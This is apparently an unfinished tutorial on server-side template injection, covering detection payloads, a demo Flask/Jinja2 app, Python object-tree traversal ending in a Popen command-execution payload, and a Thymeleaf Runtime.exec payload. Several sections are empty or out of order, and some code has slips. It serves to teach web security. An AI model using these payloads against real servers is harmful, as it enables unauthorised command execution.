# An Introduction to Server-Side Template Injections

The idea of a web application template is basically what it sounds like. Imagine its around the holidays and you are writing letters to 20+ relatives. Having to write 20+ personalized letters to each relative eventually becomes a little tedious. Your letters may end up becoming something like this:

> Dear {relative name}, 
>
> I hope you are doing well. Happy holidays.
>
> Best regards,
>
> {your name}

Web applications use a very similar approach. When a home page displays the friendly "Hello, {your name}", its retrieving data from the server and presenting it onto a template. An example can be seen from my school's learning management system:

![](/images/brightspace.png)

Templates are often used by developers and can be seen in many modern-day dynamic web frameworks. Some of them include:

- Flask/Django
- Laravel
- Hugo
- AngularJS

Because of the such widespread usage, the initial discovery of template injections introduced a whole new class of vulnerabilities still being researched today.

## What are server-side template injections? (SSTIs)
Server-side template injections, or SSTIs, were first introduced by [James Kettle](https://portswigger.net/research/server-side-template-injection) in 2015.

The main idea behind the attack is for a malicious user to abuse the "retrieve data from the server" mechanism, hence the "server-side" part to the name. 

Allowing user-input typically is a bad idea, but in some places it is necessary, such as with forms and chat messages. The issue arises when a server renders and executes the user-input, typically triggered with a special wrapper.

## Testing for SSTI
The common payload `{{7*7}}` used in Kettle's research would, in many frameworks, return to the template `49`. You can see within the curly braces, an equation is being put in the input. Because the server rendered the equation and not as as a normal string, we therefore have a form of code execution and a successful SSTI.

Other payloads with differing syntax may also include:
- `{{7*'7'}}`
- `@(7*7)`
- `${{<%[%'"}}%\.`

Another indicator of SSTI is through finding XSS vulnerabilities depending on the framework. Because both injections cause the server to do a form of rendering, some XSS locations may also be vulnerable to SSTI.

## Exploiting SSTI
So we can now calculate simple math expressions. But how do we use this to go further?

Understanding the idea that the injected code is run in an environment, we therefore should have access to environmental variables.

Depending on the framework, there will be various differences such as programming language, framework builtins, and filtering rules that may be used. Using different types of payloads as mentioned above can help with the identification of the specific framework.

In this case, we will explore various ways of SSTI in Flask.

## Exploring Flask
Flask is a Python based framework and uses Jinja2 as its templating engine. Even though Flask itself incorporates Jinja2, certain filters can still be used to allow for XSS and even SSTI.

Let's take a look at a simple Flask app. The app returns user input from a POST request and passes it back through the `data` variable:

```python
# app.py
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        data = request.form["input"]
        return render_template("index.html", data=data)
    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
```

We can create an `index.html` template in the `/templates` directory as so:

```html
<!-- index.html -->
<!DOCTYPE html>
<html>
    <head>
        <title>Flask SSTI Testing</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/water.css">
    </head>
    <body>
        <h1>Flask SSTI Testing</h1>
        
        <form method="POST">
            <input type="text" name="input">
            <input type="submit" value="Submit">
        </form>
        
        {% if data %}
        <h2>Raw Input:</h2>
        <p>{{ data }}</p>
        {% endif %}
    </body>
</html>
```

You can see the special Jinja2 syntax used in the if statement. As the Flask application renders the template, it checks whether or not the server returned a `data` variable. If so, it will be rendered onto the page.






### Object Tree Traversal
By utilizing Python builtins, we can also traverse object trees to access different types of objects. 

For example in Python, we can use some object properties such as `__mro__`, `__class__`, and `__subclasses__` to traverse up and down the object tree to bypass potential filters. The process on crafting the payload is shown below:

```python
>>> "" # just a string, can be declared
# ' '
>>> "".__class__ # retrieving the class object
# <class 'str'>
```






Following here, we use Python's Method Resolution Order, or MRO, to get all the classes the string class inherits. In this case, we are traversing up the object tree. As shown below, the string is both a string and an object:

```python
>>> "".__class__.__mro__
# (<class 'str'>, <class 'object'>)
>>> "".__class__.__mro__[1] # accessing just object from tuple
# <class 'object'>
```

Provided the object, we can now traverse back down to access a different class/object in the environment. This can be done with the `subclasses()` function. This returns a long list of all existing object in the environment:

```python
>>> "".__class__.__mro__[1].__subclasses() # 
# [<class 'type'>, <class 'weakref'>,
# ...
# <class 'apport.packaging.PackageInfo'>, <class 'gettext.NullTranslations'>]
```

From here, a useful object to obtain RCE is `subprocess.Popen`. Using the returned list from `subclasses()`, we can access the object and run its normal functions to execute code.

```python
>>> ''.__class__.__mro__[1].__subclasses__()[340]('whoami', shell=True, stdout=-1).communicate()[0].strip()
# root
```

### Using Engine Builtins




https://jinja.palletsprojects.com/en/2.11.x/templates/#lipsum



The following will be looking at the popular Flask framework closely and how it may be vulnerable to SSTI.



<!-- 
## Flask Example
Flask is a popular web framework built with Python. It uses a templating engine called Jinja2, which will be the main point of target.
 -->












## References
- https://portswigger.net/research/server-side-template-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt


### Language Builtins
In certain languages, almost everything is an object. Objects, such as strings, arrays, and booleans inherit certain global properties from other classes and will have its own set of functions.

For example in Java, the type T can be used as a payload to run commands and would be vulnerable in Thymeleaf:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```